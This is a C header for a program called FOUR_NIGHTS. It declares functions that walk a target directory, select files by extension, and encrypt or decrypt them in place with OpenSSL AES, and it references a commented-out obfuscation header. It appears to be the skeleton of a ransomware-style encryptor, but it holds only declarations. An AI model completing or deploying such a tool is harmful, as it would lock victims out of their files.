#ifndef FOUR_NIGHTS
#define FOUR_NIGHTS
/*
#include "obfuscation.h"
*/

#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#include <dirent.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#define BIGBUF  8192 /* 8KiB */
#define PATH_MAX 4096

/**
  * struct tmp_bufs_s - refillable buffers for each target file
  * @filepath: path to the file from readdir
  * @buf: buffer of BUFSIZE * 4
  * @file_offset: If buffer < file size
  * @bytes_read: bytes currently read from file.
  * @file_info: information about the target file
  * @encrypt: Struct that stores cipher encryption info
 **/
typedef struct tmp_bufs_s
{
	char *filepath;
	char *plaintext;
	off_t file_offset;
	size_t bytes_read;
	struct stat file_info;
} tmp_bufs_t;
void free_tmp_bufs_struct(tmp_bufs_t tmp_bufs);

/**
  * struct file_filter_s - struct to store often used values
  * @root_path: string that represents the target filepath
  * @file_exts_whole_str: string that contains all target file extensions
  * @file_extensions: double pointer to a list of file extensions as strings
  * @tmp_bufs: file paths in a linked list
 **/
typedef struct file_filter_s
{
	char *root_path;
	char *file_exts_whole_str;
	char **file_extensions;
	char cipher_flag; /* 'e' for encrypt, 'd' for decrypt */
	EVP_CIPHER_CTX *cipher;
	tmp_bufs_t *tmp_bufs;
} file_filter_t;

file_filter_t *init_struct(file_filter_t *file_filter, char *target_dir);
void free_file_filter_struct(file_filter_t *file_filter);

/* OS functions */
void *traverse_dir(char *filename, file_filter_t *file_filter);
size_t read_file(const char *filepath, file_filter_t *file_filter, char *(*fxn)(char *, file_filter_t *));
char *write_file(char *filepath, file_filter_t *file_filter);

/* Openssl */
EVP_CIPHER_CTX *aes_encrypt_init(EVP_CIPHER_CTX *e_ctx);
EVP_CIPHER_CTX *aes_decrypt_init(EVP_CIPHER_CTX *d_ctx);
unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len);
unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len);
int check_padding(unsigned char *filepath, size_t size);

/* DEBUGGING */
#ifndef NO_DEBUG
	void debug_list(tmp_bufs_t *tmp_bufs);
	void print_for_debug(struct file_filter_s file_filter);
#endif

/* Misc */
char *tokenizer(char *str, file_filter_t *file_filter);

/* String Functions */
int my_strncmp(const char *s1, const char *s2, size_t n);
size_t my_strlen(const char *s);
char *my_strncat(char *dest, const char *src, size_t offset, size_t n);
char *my_strtok_r(char *str, char *delim, char **saveptr);

/* Search Functions */
int binary_search(int *array, size_t size, int value);
int search_string(const char *str, char **file_exts);
unsigned int find_substr_end(char *string, char *substr);

/* Memory Management */
void *my_memset(void *s, char c, size_t n);
void *my_calloc(size_t nmemb, size_t size);
void *recalloc(void *ptr, size_t old_size, size_t new_size);


#endif /* FOUR_NIGHTS */
